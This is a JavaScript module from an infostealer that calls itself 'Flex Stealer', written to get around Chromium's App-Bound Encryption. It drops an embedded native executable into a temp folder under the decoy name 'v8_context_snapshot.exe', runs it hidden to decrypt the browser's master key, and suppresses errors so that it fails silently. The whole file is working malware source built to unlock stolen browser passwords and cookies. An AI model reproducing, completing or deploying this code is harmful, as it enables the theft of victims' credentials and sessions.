const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const { execFile } = require('child_process');
const util = require('util');
const execFileAsync = util.promisify(execFile);

/**
 * Flex Stealer | 2026 - App-Bound Decryptor
 * This module handles the bypass of Chromium's App-Bound Encryption
 * by using a native helper binary extracted at runtime.
 */

// The core-module-bin.js exports the decrypted native PE buffer
const coreBinaryBuffer = require('./core-module-bin');

/**
 * Decrypts a Chromium App-Bound encrypted key.
 * @param {string} encryptedKeyBase64 - The base64-encoded encrypted key from Local State.
 * @returns {Promise<Buffer|null>} - The decrypted master key buffer, or null if failed.
 */
async function decryptAppBoundKey(encryptedKeyBase64) {
    try {
        const tempDir = path.join(os.tmpdir(), 'chrome_check');
        await fs.ensureDir(tempDir);
        
        // Path to the native bypass tool
        const helperPath = path.join(tempDir, 'v8_context_snapshot.exe');
        
        // Write the binary to disk if it doesn't exist
        if (!await fs.pathExists(helperPath)) {
            await fs.writeFile(helperPath, coreBinaryBuffer);
        }
        
        // Execute the helper to perform decryption
        // Arguments: base64-encoded encrypted key
        // Output: base64-encoded decrypted key
        const { stdout } = await execFileAsync(helperPath, [encryptedKeyBase64], { windowsHide: true });
        
        if (stdout && stdout.trim()) {
            return Buffer.from(stdout.trim(), 'base64');
        }
    } catch (err) {
        // Silently fail as per stealer behavior
    }
    return null;
}

module.exports = {
    decryptAppBoundKey
};